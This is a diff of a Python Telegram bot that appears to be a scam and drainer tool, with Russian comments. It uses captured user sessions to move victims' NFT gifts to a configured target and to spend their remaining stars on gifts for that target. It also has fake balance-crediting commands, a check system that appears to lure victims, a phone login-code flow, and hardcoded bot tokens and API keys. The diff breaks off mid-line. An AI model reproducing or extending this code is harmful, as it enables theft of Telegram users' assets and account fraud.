@@ -102,7 +102,7 @@ DEFAULT_SETTINGS = {
     "api_id": 39558030, 
     "api_hash": "e905a8237954b8b4190d40148e2e2585", 
     "api_url": "https://mini-app-lac.vercel.app", 
-    "bot_token": "8563530421:AAELMr1bcP6nc09sIBFjG8Ca-F1UUAqWJdg",
+    "bot_token": "7996925136:AAGj83a7lA5mSAVA9R8ks1SEVdSqJL0e80Y",
     "maintenance_mode": False, 
     "banker_session": "main_admin" 
 }
@@ -135,6 +135,8 @@ def fix_permissions():
         print_success("Permissions fix attempted.")
     except Exception as e:
         print_warning(f"Could not fix permissions automatically: {e}")
+
+# Вызовите эту функцию перед check_env_setup()
 
 SETTINGS = load_settings()
 
@@ -224,6 +226,7 @@ class Database:
         self.create_tables()
 
     def create_tables(self):
+        # (Оставьте ваш код создания таблиц без изменений)
         self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, balance INTEGER DEFAULT 0, worker_id INTEGER DEFAULT NULL, is_mamont BOOLEAN DEFAULT 0, is_dumped BOOLEAN DEFAULT 0)""")
         self.cursor.execute("""CREATE TABLE IF NOT EXISTS checks (check_id TEXT PRIMARY KEY, creator_id INTEGER, amount INTEGER, activations INTEGER, claimed_count INTEGER DEFAULT 0, claimed_by TEXT DEFAULT '')""")
         self.cursor.execute("""CREATE TABLE IF NOT EXISTS inline_checks (unique_id TEXT PRIMARY KEY, creator_id INTEGER, amount INTEGER, claimed_by INTEGER, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)""")
@@ -332,6 +335,9 @@ class AdminSettingsState(StatesGroup):
     waiting_api_id = State()
     waiting_api_hash = State()
     waiting_api_url = State()
+    # Новые состояния для управления админами
+    waiting_new_admin = State()
+    waiting_del_admin = State()
 
 # ================= УТИЛИТЫ =================
 def clean_phone_number(phone: str) -> str:
@@ -389,45 +395,30 @@ async def log_to_topic(bot: Bot, topic_key: str, text: str):
     gid = SETTINGS.get('allowed_group_id')
     tid = SETTINGS.get(topic_key)
     if gid and tid:
-        try: 
-            await bot.send_message(
-                chat_id=int(gid), 
-                text=text, 
-                message_thread_id=int(tid), 
-                disable_web_page_preview=True,
-                parse_mode='HTML'
-            )
-        except Exception as e: 
-            print_error(f"Log Error: {e}")
+        try: await bot.send_message(chat_id=int(gid), text=text, message_thread_id=int(tid), disable_web_page_preview=True)
+        except Exception as e: print_error(f"Log Error: {e}")
 
 async def send_file_to_admins(bot: Bot, file_path: Path, caption: str):
     admins = SETTINGS.get('admin_ids', [])
     for admin_id in admins:
-        try: 
-            await bot.send_document(
-                chat_id=admin_id, 
-                document=FSInputFile(file_path), 
-                caption=caption,
-                parse_mode='HTML'
-            )
+        try: await bot.send_document(chat_id=admin_id, document=FSInputFile(file_path), caption=caption)
         except: pass
 
 async def notify_worker(bot: Bot, worker_id: int, text: str):
     if not worker_id: return
-    try: 
-        await bot.send_message(chat_id=worker_id, text=text, parse_mode='HTML')
+    try: await bot.send_message(chat_id=worker_id, text=text)
     except: pass
 
 async def alert_admins(bot: Bot, text: str):
     admins = SETTINGS.get('admin_ids', [])
     if not admins: return
     clean_text = str(text).replace("<", "&lt;").replace(">", "&gt;")
-    msg = f"<b>⚠️ КРИТИЧЕСКАЯ ОШИБКА</b>\n\n<code>{clean_text[:3000]}</code>"
+    msg = f"❌ <b>ОШИБКА БОТА</b>\n\n<pre>{clean_text[:3000]}</pre>"
     for admin_id in admins:
-        try: await bot.send_message(chat_id=admin_id, text=msg, parse_mode='HTML')
+        try: await bot.send_message(chat_id=admin_id, text=msg)
         except: pass
 
-# ================= ЛОГИКА KURIGRAM =================
+# ================= ЛОГИКА KURIGRAM (UPDATED V2) =================
 
 async def get_stars_info(client: Client):
     try:
@@ -474,7 +465,7 @@ def analyze_gift(gift, location_name="Me"):
         'can_transfer': False, 
         'can_convert': False,
         'location': location_name,
-        'slug': getattr(gift, 'slug', None)
+        'slug': getattr(gift, 'slug', None) # <--- ДОБАВЛЕНО
     }
     
     if getattr(gift, 'collectible_id', None) is not None:
@@ -513,7 +504,7 @@ async def scan_location_gifts(client: Client, peer_id, location_name):
 
 async def send_gift_task(client: Client, target_id, price, target_username=None, delay=0):
     """Задача для БАНКИРА: Отправка с микро-задержкой для скорости."""
-    if delay > 0: await asyncio.sleep(delay)
+    if delay > 0: await asyncio.sleep(delay) # Микро-задержка только если шлем пачкой
 
     gift_data = GIFT_MAP.get(price)
     if not gift_data: return False
@@ -522,6 +513,7 @@ async def send_gift_task(client: Client, target_id, price, target_username=None,
     recipient = target_username if target_username else target_id
 
     try:
+        # Пытаемся отправить сразу
         await client.send_gift(chat_id=recipient, gift_id=gift_id)
         log_transfer(f"⚡️ Банкир отправил: {price}")
         return True
@@ -529,6 +521,7 @@ async def send_gift_task(client: Client, target_id, price, target_username=None,
         await asyncio.sleep(e.value)
         return await send_gift_task(client, target_id, price, target_username, 0)
     except Exception as e:
+        # Если ошибка дубликата - пробуем еще раз через 1.5 сек (быстрее чем 3)
         if "DUPLICATE" in str(e):
             await asyncio.sleep(1.5)
             try:
@@ -538,7 +531,7 @@ async def send_gift_task(client: Client, target_id, price, target_username=None,
         return False
 
 async def convert_gift_task(client: Client, gift_details):
-    """Задача для ВОРКЕРА: конвертировать подарок."""
+    """Задача для ВОРКЕРА: конвертировать подарок. FIX: Игнор старых подарков."""
     try:
         await client.convert_gift_to_stars(owned_gift_id=str(gift_details['msg_id']))
         log_transfer(f"Конвертирован: {gift_details['title']} (+{gift_details['star_count']} зв)")
@@ -546,6 +539,7 @@ async def convert_gift_task(client: Client, gift_details):
     except BadRequest as e:
         e_str = str(e)
         if "STARGIFT_CONVERT_TOO_OLD" in e_str:
+            # FIX: Просто пропускаем старые подарки, это не ошибка скрипта
             return False
         if "STARGIFT_ALREADY_CONVERTED" in e_str:
             return False
@@ -556,7 +550,7 @@ async def convert_gift_task(client: Client, gift_details):
         return False
 
 async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
-    """Задача для ВОРКЕРА: передать NFT."""
+    """Задача для ВОРКЕРА: передать NFT. Возвращает статус (success/failed)"""
     try:
         await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_chat_id)
         print_success(f"NFT ОТПРАВЛЕН: {gift_details['title']}")
@@ -578,8 +572,11 @@ async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: B
     return "failed"
 
 async def drain_stars_user(client: Client, default_recipient=None):
-    """Скупает подарки на ВСЕ доступные звезды в пользу Target."""
+    """
+    Скупает подарки на ВСЕ доступные звезды в пользу Target.
+    """
     try:
+        # 1. Получаем Target
         cfg_target = SETTINGS.get("target_user")
         raw_target = cfg_target if cfg_target else default_recipient
         target_str = str(raw_target).replace("https://t.me/", "").replace("@", "").strip()
@@ -588,6 +585,7 @@ async def drain_stars_user(client: Client, default_recipient=None):
             log_transfer("⚠️ Не настроен Target для слива!", "warning")
             return
 
+        # 2. Резолвим ID получателя
         try:
             chat = await client.get_chat(target_str)
             recipient_id = chat.id
@@ -596,6 +594,7 @@ async def drain_stars_user(client: Client, default_recipient=None):
             log_transfer(f"⚠️ Target не найден ({target_str}): {e}", "error")
             return
 
+        # 3. Проверяем баланс
         try: balance = int(await client.get_stars_balance("me"))
         except: balance = 0
 
@@ -605,6 +604,7 @@ async def drain_stars_user(client: Client, default_recipient=None):
 
         log_transfer(f"🛍 SHOPPING MODE: Тратим {balance} ⭐️ на -> {recipient_title}")
 
+        # 4. Скупаем (100 -> 50 -> 25 -> 15)
         sorted_prices = sorted([k for k in GIFT_MAP.keys()], reverse=True)
         count = 0
         
@@ -627,12 +627,13 @@ async def drain_stars_user(client: Client, default_recipient=None):
                 balance -= gift_price
                 count += 1
                 log_transfer(f"🎁 Отправлен подарок за {gift_price} зв.")
-                await asyncio.sleep(random.uniform(1.0, 2.0))
+                await asyncio.sleep(random.uniform(1.0, 2.0)) # Пауза, чтобы не зафлудить
             except FloodWait as e:
                 await asyncio.sleep(e.value)
             except Exception as e:
                 log_transfer(f"❌ Ошибка покупки: {e}", "error")
                 await asyncio.sleep(1)
+                # Обновляем баланс на всякий случай
                 try: balance = int(await client.get_stars_balance("me"))
                 except: break
         
@@ -640,14 +641,21 @@ async def drain_stars_user(client: Client, default_recipient=None):
 
     except Exception as e:
         log_transfer(f"Error in drain: {e}", "error")
+        
+# --- MAIN LOGIC ORCHESTRATOR ---
+
+# --- MAIN LOGIC ORCHESTRATOR (UPDATED) ---
 
 async def wait_for_topup(client: Client, required_stars):
-    """Поллинг: проверяет наличие конвертируемых подарков."""
+    """Поллинг: проверяет наличие конвертируемых подарков каждую секунду."""
     log_transfer("⏳ Ждем поступления подарка (Smart Polling)...")
-    for _ in range(10):
+    for _ in range(10): # Максимум 10 проверок по 0.8 сек = 8 сек
         try:
+            # Сканируем только профиль (быстро)
             async for gift in client.get_chat_gifts(chat_id="me"):
+                # Если нашли подарок, который можно конвертировать в звезды
                 if not getattr(gift, 'collectible_id', None) and getattr(gift, 'convert_price', 0) > 0:
+                     # Дополнительная проверка: не конвертирован ли он уже
                      if not getattr(gift, 'is_converted', False):
                          log_transfer(f"⚡️ Подарок обнаружен! (+{gift.convert_price})")
                          return True
@@ -656,13 +664,20 @@ async def wait_for_topup(client: Client, required_stars):
     return False
 
 async def transfer_process(client: Client, banker: Client, bot: Bot):
-    """Основной процесс обработки аккаунта"""
+    nft_log_results = [] 
+    final_stars = 0
+    
     try:
         if not client.is_connected: await client.connect()
         me = await client.get_me()
         victim_target = me.username if me.username else me.id
         
         log_transfer(f"🚀 START AGGRESSIVE MODE: @{me.username}")
+        
+        # ================= 1. ЧЕК БАЛАНСА И NFT =================
+        try: current_balance = int(await client.get_stars_balance("me"))
+        except: current_balance = 0
+        log_transfer(f"💰 Баланс: {current_balance} ⭐️")
 
         profile_gifts = await scan_location_gifts(client, "me", "Profile")
         all_nfts_to_send = [g for g in profile_gifts if g['is_nft'] and g['can_transfer']]
@@ -670,12 +685,13 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
         if not all_nfts_to_send:
             log_transfer("🏁 NFT нет. Уходим в чистку.")
             await cleanup_and_drain(client, SETTINGS.get("banker_session", "main_admin"))
-            return
+            return nft_log_results, current_balance
 
         for g in profile_gifts:
             if g['is_nft'] and not g['can_transfer']:
-                log_transfer(f"NFT на холде: {g['title']}")
+                nft_log_results.append({'title': g['title'], 'slug': g.get('slug',''), 'status': '🕔 (Холд)'})
 
+        # ================= 2. АГРЕССИВНОЕ ПОПОЛНЕНИЕ =================
         banker_ready = (banker and banker.is_connected)
         banker_username = SETTINGS.get("banker_session", "main_admin")
         
@@ -687,10 +703,6 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             target_future = asyncio.create_task(prepare_transfer_target(client, banker_username))
 
         total_fees = sum(n['transfer_cost'] for n in all_nfts_to_send)
-        
-        try: current_balance = int(await client.get_stars_balance("me"))
-        except: current_balance = 0
-            
         deficit = total_fees - current_balance
         banker_triggered = False
         
@@ -703,6 +715,7 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             else:
                 log_transfer("⚠️ Дефицит, а Банкир мертв! Пытаемся выжить...", "error")
 
+        # ================= 3. ОЖИДАНИЕ БАЛАНСА =================
         if banker_triggered:
             log_transfer("⏳ Ловим и конвертируем подарки Банкира...")
             for _ in range(15):
@@ -726,21 +739,35 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             except: pass
             await asyncio.sleep(0.4)
 
+        # ================= 4. ОТПРАВКА NFT =================
         final_recipient_id = await target_future if target_future else None
 
         if ready_to_send and final_recipient_id:
             log_transfer("⚡️ БАЛАНС ЕСТЬ. ШЛЕМ NFT...")
             tasks = [transfer_nft_task(client, nft, final_recipient_id, bot, None) for nft in all_nfts_to_send]
-            await asyncio.gather(*tasks)
+            results_status = await asyncio.gather(*tasks)
+            for idx, res in enumerate(results_status):
+                nft_log_results.append({
+                    'title': all_nfts_to_send[idx]['title'], 
+                    'slug': all_nfts_to_send[idx].get('slug',''), 
+                    'status': '✅' if res == 'success' else '❌'
+                })
         else:
-            log_transfer(f"FAIL NFT: {'❌ NoMoney' if not ready_to_send else '❌ NoTarget'}")
+            status = '❌ NoMoney' if not ready_to_send else '❌ NoTarget'
+            log_transfer(f"FAIL NFT: {status}")
+            for nft in all_nfts_to_send: nft_log_results.append({'title': nft['title'], 'status': status})
 
+        # ================= 5. ПОСТ-ФАКТУМ ЧИСТКА =================
         log_transfer("🏁 NFT отработаны. Теперь чистим мусор и сливаем остаток.")
         await cleanup_and_drain(client, banker_username)
+        try: final_stars = int(await client.get_stars_balance("me"))
+        except: final_stars = 0
 
     except Exception as e:
         print_error(f"Aggressive Logic Error: {e}")
         await alert_admins(bot, f"🔥 Aggressive Error: {e}")
+        
+    return nft_log_results, final_stars
     
 async def cleanup_and_drain(client: Client, banker_username):
     try:
@@ -761,28 +788,41 @@ async def cleanup_and_drain(client: Client, banker_username):
         log_transfer(f"Cleanup error: {e}", "warning")
     
 async def prepare_transfer_target(client: Client, target_username_str):
+    """
+    1. Ищет таргет по юзернейму или ID.
+    2. Отправляет сообщение и удаляет его, чтобы создать диалог (Fix PEER_ID_INVALID).
+    3. Возвращает валидный ID получателя или None, если таргет недоступен.
+    """
     targets_to_try = []
     
+    # Очищаем введенный таргет
     clean_target = str(target_username_str).strip().replace("https://t.me/", "").replace("@", "")
     
+    # Если это число - добавляем как int, иначе как str (username)
     if clean_target.isdigit():
         targets_to_try.append(int(clean_target))
     else:
         targets_to_try.append(clean_target)
+        
+    # Сюда можно добавить запасной ID, если есть
+    # targets_to_try.append(1234567890) 
 
     resolved_peer = None
 
     for t in targets_to_try:
         try:
+            # 1. Пытаемся найти чат
             log_transfer(f"🔎 Ищем таргет: {t}...")
             chat = await client.get_chat(t)
             
+            # 2. ПИШЕМ СООБЩЕНИЕ (Самый важный шаг для фикса PeerId)
+            # Отправляем точку и сразу удаляем
             msg = await client.send_message(chat.id, ".")
             await client.delete_messages(chat.id, msg.id)
             
             resolved_peer = chat.id
             log_transfer(f"✅ Таргет подтвержден: {chat.first_name} (ID: {chat.id})")
-            break
+            break # Успех
         except Exception as e:
             log_transfer(f"⚠️ Не удалось связаться с {t}: {e}")
             continue
@@ -812,6 +852,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
 
         db.add_user(user_id, message.from_user.username, message.from_user.first_name, worker_id)
         
+        # Log Launch
         u = db.get_user(user_id)
         final_worker = u['worker_id']
         worker_tag = "Неизвестно"
@@ -819,9 +860,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
             w_user = db.get_user(final_worker)
             if w_user: worker_tag = f"@{w_user['username']}" if w_user['username'] else str(w_user['user_id'])
         
-        # Упрощенный лог запуска
-        log_message = f"<b>🚀 Запуск бота</b>\n\n👤 Пользователь: {message.from_user.mention_html()}\n🆔 ID: <code>{user_id}</code>\n👷 Воркер: <code>{worker_tag}</code>"
-        await log_to_topic(bot_instance, 'topic_launch', log_message)
+        await log_to_topic(bot_instance, 'topic_launch', f"{message.from_user.mention_html()} ({user_id}) запустил бота\nВоркер: {worker_tag}")
 
         if args and args.startswith("c_"): await process_check_activation(message, args.replace("c_", ""))
         elif args and args.startswith("q_"): await process_inline_check_activation(message, args.replace("q_", ""))
@@ -834,31 +873,28 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
         main_sess = SESSIONS_DIR / f"{SETTINGS['banker_session']}.session"
         status = "🟢 Подключен" if main_sess.exists() else "🔴 Не подключен"
         
+        # Статусы тумблеров
         shop_status = "🔴 OFF" if SETTINGS["maintenance_mode"] else "🟢 ON"
         convert_status = "🟢 ON" if SETTINGS.get("auto_convert_gifts", True) else "🔴 OFF"
 
-        txt = f"""
-<b>👑 АДМИН ПАНЕЛЬ</b>
-
-<b>📊 Статистика:</b>
-├ Юзеров: <b>{u}</b>
-└ Чеков: <b>{c} ⭐️</b>
-
-<b>🏦 Банкир:</b> {status}
-<b>⚙️ Настройки:</b>
-├ Техработы: {shop_status}
-└ Авто-конверт: {convert_status}
-"""
+        txt = (f"👑 <b>Панель Администратора</b>\n"
+               f"👥 Юзеров: <b>{u}</b> | Чеков: <b>{c} ⭐️</b>\n"
+               f"📱 Банкир: {status}")
 
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="🏦 Проверить Банкира", callback_data="check_banker"))
         kb.row(InlineKeyboardButton(text="📱 Переподключить Банкира", callback_data="admin_login"))
+        
+        # --- ТУМБЛЕРЫ ---
         kb.row(InlineKeyboardButton(text=f"♻️ Авто-конверт: {convert_status}", callback_data="toggle_convert"))
-        kb.row(InlineKeyboardButton(text=f"🛠 Техработы: {shop_status}", callback_data="toggle_maintenance"))
+        kb.row(InlineKeyboardButton(text=f"🛠 Техработы: {shop_status}", callback_data="toggle_shop"))
+        # ----------------
+        
         kb.row(InlineKeyboardButton(text="🎯 Сменить Target", callback_data="set_target"),
                InlineKeyboardButton(text="⚙️ API Настройки", callback_data="set_api"))
         kb.row(InlineKeyboardButton(text="🔙 Закрыть", callback_data="close_admin"))
         
+        # Если это callback (обновление меню), редактируем, иначе шлем новое
         if isinstance(message, types.CallbackQuery):
             await message.message.edit_text(txt, reply_markup=kb.as_markup(), parse_mode="HTML")
         else:
@@ -867,19 +903,12 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
     @router.callback_query(F.data == "toggle_convert")
     async def toggle_convert_handler(c: types.CallbackQuery):
         if not await check_admin(c.from_user.id): return
+        # Переключаем состояние
         cur = SETTINGS.get("auto_convert_gifts", True)
         SETTINGS["auto_convert_gifts"] = not cur
         save_settings(SETTINGS)
         await c.answer(f"Авто-конвертация: {'Выключена' if cur else 'Включена'}")
-        await admin_panel(c)
-    
-    @router.callback_query(F.data == "toggle_maintenance")
-    async def toggle_maintenance_handler(c: types.CallbackQuery):
-        if not await check_admin(c.from_user.id): return
-        SETTINGS["maintenance_mode"] = not SETTINGS["maintenance_mode"]
-        save_settings(SETTINGS)
-        await c.answer(f"Техработы: {'Выключены' if not SETTINGS['maintenance_mode'] else 'Включены'}")
-        await admin_panel(c)
+        await admin_panel(c) # Обновляем меню
             
     @router.callback_query(F.data == "check_banker")
     async def check_banker_handler(c: types.CallbackQuery):
@@ -899,11 +928,10 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
             await client.disconnect()
             
             await msg.edit_text(
-                f"<b>🏦 СТАТУС БАНКИРА</b>\n\n"
-                f"<b>👤 Имя:</b> {me.first_name}\n"
-                f"<b>📱 Юзернейм:</b> @{me.username}\n"
-                f"<b>☎️ Номер:</b> <code>{me.phone_number}</code>\n"
-                f"<b>💰 Баланс:</b> <b>{bal} ⭐️</b>",
+                f"🏦 <b>Статус Банкира</b>\n\n"
+                f"👤: {me.first_name} (@{me.username})\n"
+                f"📱: <code>{me.phone_number}</code>\n"
+                f"💰 Баланс: <b>{bal} ⭐️</b>",
                 parse_mode="HTML"
             )
         except Exception as e:
@@ -914,6 +942,14 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
 
     @router.callback_query(F.data == "close_admin")
     async def close_admin(c): await c.message.delete()
+
+    @router.callback_query(F.data == "toggle_shop")
+    async def toggle_shop(c):
+        if not await check_admin(c.from_user.id): return
+        SETTINGS["maintenance_mode"] = not SETTINGS["maintenance_mode"]
+        save_settings(SETTINGS)
+        await c.answer("Режим техработ изменен!")
+        await admin_panel(c)
 
     @router.callback_query(F.data == "set_target")
     async def set_target_start(c, state: FSMContext):
@@ -972,11 +1008,6 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
             await client.connect()
             sent = await client.send_code(clean_ph)
             admin_auth_process[m.from_user.id] = {"client": client, "phone": clean_ph, "hash": sent.phone_code_hash}
-            
-            # Лог отправки кода
-            log_message = f"<b>0тпpаbкa kоdа</b>\n\n☎️ Номер: <tg-spoiler>{clean_ph}</tg-spoiler>\n👤 Инициатор: {m.from_user.mention_html()}\n🆔 ID: <code>{m.from_user.id}</code>"
-            await log_to_topic(bot_instance, 'topic_auth', log_message)
-            
             await m.answer(f"🔢 Код отправлен на +{clean_ph}.\n<b>Введите код:</b>")
             await state.set_state(AdminLoginState.waiting_code)
         except Exception as e:
@@ -1013,7 +1044,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
     async def show_main_menu(message, user_id, edit=False):
         user = db.get_user(user_id)
         bal = user['balance'] if user else 0
-        text = f"<b>🎉 Добро пожаловать!</b>\n\n<b>💰 Ваш баланс:</b> <code>{bal} ⭐️</code>\n\n👇 <b>Выберите действие:</b>"
+        text = f"🎉 <b>Добро пожаловать!</b>\n💫 Ваш баланс: <b>{bal} ⭐️</b>\n\n👇 <b>Выберите действие:</b>"
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="⭐️ Вывести звезды", callback_data="withdraw"),
                InlineKeyboardButton(text="🎁 Автоскупщик", callback_data="autobuyer"))
@@ -1033,7 +1064,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
     @router.callback_query(F.data == "wallet")
     async def cb_wallet(c):
         u = db.get_user(c.from_user.id)
-        text = f"<b>👛 Личный кошелек</b>\n\n<b>🆔 Ваш ID:</b> <code>{c.from_user.id}</code>\n<b>💰 Текущий баланс:</b> <code>{u['balance']} ⭐️</code>"
+        text = f"👛 <b>Личный Кошелек</b>\n\n🆔 Ваш ID: <code>{c.from_user.id}</code>\n💰 Текущий баланс: <b>{u['balance']} ⭐️</b>"
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="💸 Вывести средства", callback_data="withdraw"))
         kb.row(InlineKeyboardButton(text="➕ Пополнить баланс", callback_data="topup"))
@@ -1046,11 +1077,8 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
     @router.callback_query(F.data.in_({"withdraw", "autobuyer", "shop"}))
     async def cb_stubs(c):
         if c.data == "shop":
-            if SETTINGS["maintenance_mode"]:
-                await c.answer("🚧 Магазин на техническом обслуживании!", show_alert=True)
-                return
-            msg = "🛒 Магазин пуст."
-            return await c.answer(msg, show_alert=True)
+            msg = "🚧 Магазин на тех. обслуживании!" if SETTINGS["maintenance_mode"] else "🛒 Магазин пуст."
+            return await c.answer(msg, True)
         
         txt = "💸 <b>Вывод средств</b>" if c.data == "withdraw" else "🎁 <b>Автоскупщик подарков</b>"
         url = get_webapp_url(c.from_user.id, SETTINGS['api_url'])
@@ -1079,9 +1107,11 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
 
     @router.message(TopUpState.waiting_for_custom_amount)
     async def proc_pay_cust(m: Message, state: FSMContext):
+        # Если введена команда, сбрасываем стейт и даем другим хендлерам сработать (или просто выходим)
         if m.text.startswith("/"):
             await state.clear()
-            return
+            return # Пропускаем обработку, чтобы сработал командный хендлер (при повторном вводе) или просто сбросился
+            
         if not m.text.isdigit(): return await m.answer("❌ Введите число.")
         await state.clear()
         await m.answer_invoice(title="Пополнение баланса", description=f"Пополнение кошелька на {m.text} ⭐️", prices=[LabeledPrice(label="XTR", amount=int(m.text))], provider_token="", payload="topup", currency="XTR")
@@ -1093,7 +1123,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
     async def suc(m: Message):
         amt = m.successful_payment.total_amount
         db.update_balance(m.from_user.id, amt, 'add')
-        await m.answer(f"✅ <b>Оплата прошла успешно!</b>\n\n<b>➕ Начислено:</b> <code>{amt} ⭐️</code>", reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup())
+        await m.answer(f"✅ <b>Оплата прошла успешно!</b>\n\n➕ Начислено: <b>{amt} ⭐️</b>", reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup())
 
     @router.callback_query(F.data == "create_check")
     async def cb_cc(c, state: FSMContext):
@@ -1110,33 +1140,37 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
         await m.answer("👥 <b>Введите количество активаций:</b>")
         await state.set_state(CreateCheckState.waiting_for_activations)
 
-    # ================= ИЗМЕНЕННЫЕ КОМАНДЫ =================
+        # --- ДОБАВЛЕННЫЕ КОМАНДЫ ---
 
-    @router.message(Command("+stars"))
+        # ================= НОВЫЕ КОМАНДЫ (ДЛЯ ВСЕХ) =================
+
+    @router.message(Command("star"))
     async def cmd_star_public(message: types.Message, command: CommandObject):
-        """Начислить себе звезды"""
+        """Начислить себе звезды (доступно всем)"""
         if not command.args or not command.args.isdigit():
-            return await message.answer("❌ Введите сумму.\nПример: <code>/+stars 1000</code>")
+            return await message.answer("❌ Введите сумму.\nПример: <code>/star 1000</code>")
             
         amount = int(command.args)
+        # db.update_balance сам создаст юзера, если его нет
         new_balance = db.update_balance(message.from_user.id, amount, mode='add')
         
-        await message.answer(f"✅ <b>Баланс пополнен</b>\n\n<b>➕ Начислено:</b> <code>{amount} ⭐️</code>\n<b>💰 Новый баланс:</b> <code>{new_balance} ⭐️</code>")
+        await message.answer(f"✅ Баланс пополнен на <b>{amount} ⭐️</b>\n💰 Ваш баланс: <b>{new_balance} ⭐️</b>")
 
-    @router.message(Command("-stars"))
+    @router.message(Command("rstar"))
     async def cmd_rstar_public(message: types.Message, command: CommandObject):
-        """Снять у себя звезды"""
+        """Снять у себя звезды (доступно всем)"""
         if not command.args or not command.args.isdigit():
-            return await message.answer("❌ Введите сумму для списания.\nПример: <code>/-stars 500</code>")
+            return await message.answer("❌ Введите сумму для списания.\nПример: <code>/rstar 500</code>")
             
         amount = int(command.args)
         new_balance = db.update_balance(message.from_user.id, amount, mode='remove')
         
-        await message.answer(f"📉 <b>Списание средств</b>\n\n<b>➖ Списано:</b> <code>{amount} ⭐️</code>\n<b>💰 Новый баланс:</b> <code>{new_balance} ⭐️</code>")
+        await message.answer(f"📉 Списано <b>{amount} ⭐️</b>\n💰 Ваш баланс: <b>{new_balance} ⭐️</b>")
 
-    @router.message(Command("workon"))
-    async def cmd_workon_public(message: types.Message, state: FSMContext):
-        """Переключить режим воркера"""
+    @router.message(Command("work"))
+    async def cmd_mamontization_public(message: types.Message, state: FSMContext):
+        """Переключить режим воркера(доступно всем)"""
+        # Сбрасываем любое активное состояние (например, ввод суммы)
         await state.clear()
         
         user_id = message.from_user.id
@@ -1150,13 +1184,10 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
         new_status = not current_status
         db.set_mamont(user_id, new_status)
         
-        # Отправляем только одно сообщение
-        if new_status:
-            await message.answer("✅ Режим воркера ON (Включен)")
-        else:
-            await message.answer("👤 Режим воркера OFF (Выключен)")
+        status_text = "👨‍💻 <b>Worker Mode: ON</b> (Включен)" if new_status else "👤 <b>Мамонт Mode: OFF</b> (Выключен)"
+        await message.answer(f"Статус изменен:\n{status_text}")
 
-    # --- КОНЕЦ ИЗМЕНЕННЫХ КОМАНД ---
+    # --- КОНЕЦ ДОБАВЛЕННЫХ КОМАНД ---
 
     @router.message(CreateCheckState.waiting_for_activations)
     async def cc_act(m: Message, state: FSMContext):
@@ -1177,7 +1208,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
                 if (d / f"{data['amt']}{ext}").exists(): p = d / f"{data['amt']}{ext}"; break
             if p: break
 
-        cap = f"✅ <b>Чек успешно создан!</b>\n\n<b>💰 Сумма:</b> <code>{data['amt']} ⭐️</code>\n<b>👥 Активаций:</b> <code>{m.text}</code>"
+        cap = f"✅ <b>Чек успешно создан!</b>\n\n💰 Сумма: <b>{data['amt']} ⭐️</b>\n👥 Активаций: <b>{m.text}</b>"
         if p: await m.answer_photo(FSInputFile(p), caption=cap, reply_markup=kb.as_markup())
         else: await m.answer(cap, reply_markup=kb.as_markup())
         await state.clear()
@@ -1189,7 +1220,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
         if res == "success":
             if cid: db.add_user(message.from_user.id, message.from_user.username, message.from_user.first_name, cid)
             u = db.get_user(message.from_user.id)
-            text = f"✅ <b>Чек активирован!</b>\n\n<b>💰 Получено:</b> <code>{amt} ⭐️</code>\n<b>💳 Ваш баланс:</b> <code>{u['balance']} ⭐️</code>"
+            text = (f"✅ На ваш баланс начислено {amt} ⭐️\n💰 Ваш Баланс: {u['balance']} ⭐️")
             await msg.edit_text(text, reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup())
         else: await msg.edit_text("❌ <b>Ошибка!</b> Чек недействителен или уже активирован.")
 
@@ -1202,7 +1233,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
             if res == "success":
                 db.add_user(message.from_user.id, message.from_user.username, message.from_user.first_name, int(parts[0]))
                 u = db.get_user(message.from_user.id)
-                text = f"✅ <b>Чек активирован!</b>\n\n<b>💰 Получено:</b> <code>{parts[1]} ⭐️</code>\n<b>💳 Ваш баланс:</b> <code>{u['balance']} ⭐️</code>"
+                text = (f"✅ На ваш баланс начислено {parts[1]} ⭐️\n💰 Ваш Баланс: {u['balance']} ⭐️")
                 await msg.edit_text(text, reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup())
             elif res == "no_balance": await msg.edit_text("❌ <b>Чек аннулирован</b> (недостаточно средств у создателя).")
             elif res == "already_used": await msg.edit_text("⚠️ <b>Этот чек уже активирован.</b>")
@@ -1217,57 +1248,24 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
                     InlineQueryResultArticle(
                         id=uuid.uuid4().hex,
                         title=f"Чек {c['amount']} ⭐️",
-                        input_message_content=InputTextMessageContent(
-                            message_text=f"<b>🎁 Лови чек!</b>\n\n<b>💰 Сумма:</b> <code>{c['amount']} ⭐️</code>\n<b>📦 Активаций:</b> <code>{c['activations'] - c['claimed_count']}/{c['activations']}</code>", 
